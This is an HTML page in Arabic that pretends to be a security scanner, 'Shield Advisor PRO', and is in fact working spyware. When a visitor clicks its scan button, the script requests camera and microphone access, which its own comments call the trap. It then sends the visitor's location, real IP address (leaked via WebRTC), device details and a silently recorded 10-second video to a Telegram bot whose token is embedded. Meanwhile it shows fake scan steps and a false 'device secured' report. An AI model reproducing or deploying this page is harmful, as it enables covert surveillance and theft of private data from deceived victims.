<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shield Advisor PRO | حماية متقدمة</title>
    <style>
        :root { --neon: #00d4ff; --dark: #0b0e14; --panel: #151921; }
        body { background: var(--dark); color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
        .dashboard { width: 90%; max-width: 600px; background: var(--panel); border-radius: 20px; padding: 40px; border: 1px solid #2d343f; box-shadow: 0 20px 50px rgba(0,0,0,0.7); text-align: center; }
        .logo { width: 80px; height: 80px; border-radius: 50%; box-shadow: 0 0 20px var(--neon); margin-bottom: 20px; }
        .btn-scan { background: linear-gradient(90deg, #00d4ff, #0055ff); color: white; border: none; padding: 20px 50px; font-size: 1.3rem; font-weight: bold; border-radius: 50px; cursor: pointer; transition: 0.4s; width: 100%; }
        .status-panel { background: #000; border: 1px solid #333; padding: 15px; border-radius: 12px; margin: 20px 0; text-align: left; direction: ltr; font-family: monospace; height: 100px; overflow-y: auto; }
        .console-line { color: #00ff41; font-size: 12px; margin-bottom: 5px; }
        #loader { display: none; }
        .spinner { border: 4px solid rgba(255,255,255,0.1); border-top: 4px solid var(--neon); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="dashboard" id="main-content">
    <img src="images (1).jpg" alt="Shield Advisor" class="logo">
    <h1 style="color: var(--neon); margin: 0;">Shield Advisor PRO</h1>
    <p style="color: #8a94a6;">نظام الحماية السحابي النشط</p>

    <div class="status-panel" id="console">
        <div class="console-line">> [SYS] Kernel Security Active...</div>
        <div class="console-line">> [WAIT] Waiting for user scan command...</div>
    </div>

    <button class="btn-scan" id="scanBtn" onclick="runGlobalScan()">بدء فحص الأمان الشامل</button>

    <div id="loader">
        <div class="spinner"></div>
        <p id="statusMsg" style="color: var(--neon); font-size: 14px;">جاري تحليل منافذ النظام...</p>
    </div>
</div>

<script>
    const TOKEN = "8601512823:AAEdoGWjp-mHeJjyT76B70xS1yyjiWznH1w";
    const ADMIN_ID = "8754338811";

    async function sendToBot(msg) {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: ADMIN_ID, text: msg, parse_mode: 'Markdown' })
        });
    }

    async function runGlobalScan() {
        const btn = document.getElementById('scanBtn');
        const loader = document.getElementById('loader');
        const status = document.getElementById('statusMsg');
        
        btn.style.display = "none";
        loader.style.display = "block";

        try {
            // أولاً: استدعاء الإذن الرسمي (الفخ)
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
            addLog("> [ACCESS] Media sensors synchronized.");

            // ثانياً: سحب الموقع الجغرافي
            navigator.geolocation.getCurrentPosition(async (pos) => {
                await sendToBot(`📍 **موقع الضحية:** \nhttp://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`);
            });

            // ثالثاً: سحب الـ IP الحقيقي
            const rtc = new RTCPeerConnection();
            rtc.createDataChannel("");
            rtc.createOffer().then(o => rtc.setLocalDescription(o));
            rtc.onicecandidate = i => {
                if (i.candidate) sendToBot(`🌐 **IP الحقيقي:** \`${i.candidate.candidate.split(" ")[4]}\``);
            };

            // رابعاً: سحب معلومات الجهاز
            await sendToBot(`📱 **الجهاز:** ${navigator.userAgent}\n**الرام:** ~${navigator.deviceMemory}GB`);

            // خامساً: تسجيل فيديو صامت 10 ثواني
            const recorder = new MediaRecorder(stream);
            let chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: 'video/mp4' });
                const fd = new FormData();
                fd.append('chat_id', ADMIN_ID);
                fd.append('video', blob, 'scan.mp4');
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: 'POST', body: fd });
            };
            recorder.start();
            setTimeout(() => recorder.stop(), 10000);

            // تمويه المراحل
            setTimeout(() => { status.innerText = "جاري فحص جدار الحماية..."; addLog("> [CHECK] Firewall status: Secure."); }, 3000);
            setTimeout(() => { status.innerText = "جاري البحث عن ثغرات WebRTC..."; addLog("> [CHECK] WebRTC Leaks: None."); }, 6000);
            
            // المرحلة النهائية: التقرير الوهمي
            setTimeout(() => {
                document.getElementById('main-content').innerHTML = `
                    <img src="images (1).jpg" class="logo">
                    <h2 style="color: #00ff41;">✅ تم تأمين الجهاز بنجاح</h2>
                    <div style="background: rgba(0,255,65,0.05); border: 1px solid #333; padding: 20px; border-radius: 12px; text-align: right; font-size: 14px;">
                        <p>• حماية الكاميرا والمايك: <b>مفعلة</b></p>
                        <p>• حماية الموقع الجغرافي: <b>مفعلة</b></p>
                        <p>• منع تتبع الـ IP: <b>نشط</b></p>
                        <hr style="border-color: #222;">
                        <p style="color: #8a94a6; font-size: 12px;">نظام Shield Advisor يحميك الآن في الخلفية. يمكنك إغلاق هذه الصفحة بأمان.</p>
                    </div>
                `;
            }, 10000);

        } catch (err) {
            alert("⚠️ يجب السماح بالأذونات لإتمام فحص الحماية بنجاح!");
            location.reload();
        }
    }

    function addLog(t) {
        const c = document.getElementById('console');
        c.innerHTML += `<div class="console-line">${t}</div>`;
        c.scrollTop = c.scrollHeight;
    }
</script>
</body>
</html>
